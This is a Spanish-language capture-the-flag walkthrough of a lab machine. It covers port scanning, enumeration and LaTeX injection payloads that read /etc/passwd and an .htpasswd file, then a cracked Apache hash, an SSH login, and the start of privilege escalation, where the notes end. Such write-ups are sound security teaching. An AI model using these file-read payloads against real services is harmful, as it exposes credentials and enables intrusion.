Realizamos un escaneo superficial con [[Anotaciones/Herramientas/Nmap]]
```bash
sudo nmap -p- -sS 10.10.11.217 -n -Pn -vvv --min-rate 5000 -oG allports
```
![[Pasted image 20231009161240.png]]
vamos a ser mas exhaustivos
```bash
sudo nmap -p22,80 -sVC -vvv --min-rate 5000 10.10.11.217
```
![[Pasted image 20231009162046.png]]
vamos a ver la web que hay detras del puerto 80
![[Pasted image 20231009162123.png]]
el unico enlace de interes es este:
![[Pasted image 20231009162145.png]]
que nos reenvia a un pagina .php, vamos  a hacer una enumeración de subdominios con [[Knockpy]]
```bash
knockpy dominio.com
```
![[Pasted image 20231009182307.png]]
invetigando he encontrado que latex tiene injeccion de codigo, https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection
usando este comando podemos leer archivos del sistema:
```latex
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
```
pero debemos encerrarlo en `$` 
```latex
$\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}$
```
vamos leer `/etc/passwd`
```latex
$\lstinputlisting{/etc/passwd}$
```
![[Pasted image 20231009182908.png]]

si intentamos estrar en el subdominio encontrado anteriormente nos pedira un login, algo que podemos hacer es una enumracion de direcotorios con [[dirSearch]] 
```bash
dirsearch -u http://10.10.11.217/
```
![[Pasted image 20231009184045.png]]

ahora que tenemos el nombre de potencias archivos vamos a buscar buscar en que carpetas del servidor aparche estan, recordamos que tenemos:
- /var/www
	- http
	- stats
	- dev
en alguna de ellas deben estar los archivos que nos interesan, en este caso el mas importante es `.htaccess`
```latex
$\lstinputlisting{/var/www/dev/.htaccess}$
```
![[Pasted image 20231009190250.png]]
vamos a ver que hay en esa ruta
```latex
$\lstinputlisting{/var/www/dev/.htpasswd}$
```
![[Pasted image 20231009190727.png]]
tenemos esto que es el usuario y la password en formato MD5 ahora debemos desencriptarla con [[hashcat]] o [[john the ripper]]
hash: `$apr1$1ONUB / S2$58eeNVirnRDB5zAIbIxTY0` - `calculus20`
ahora vamos a ver si inicia session en la web ![[Pasted image 20231009193027.png]]
esto me hace pensar en si tambien podremos entrar por ssh y asi es![[Pasted image 20231009193044.png]]
despues de hacer un [[Tratamiento de la tty]], vamos a intentar la escalada de privilegios, si hacemos ls podemos ver que tenemos la herramienta [[pspy64]] la usaamos y vemos este servicicio:
```bash
/bin/sh /opt/gnuplot/getdata.sh 
```
